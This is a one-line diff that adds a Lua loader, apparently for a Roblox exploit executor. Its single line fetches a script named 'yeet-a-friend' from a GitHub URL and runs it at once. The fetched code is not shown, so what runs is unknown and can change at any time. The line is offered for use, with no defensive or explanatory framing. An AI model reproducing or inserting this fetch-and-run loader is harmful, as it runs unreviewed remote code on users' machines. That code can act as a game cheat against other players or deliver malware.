@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/gss-blackcat/yeet-a-friend/main/main.lua'))()
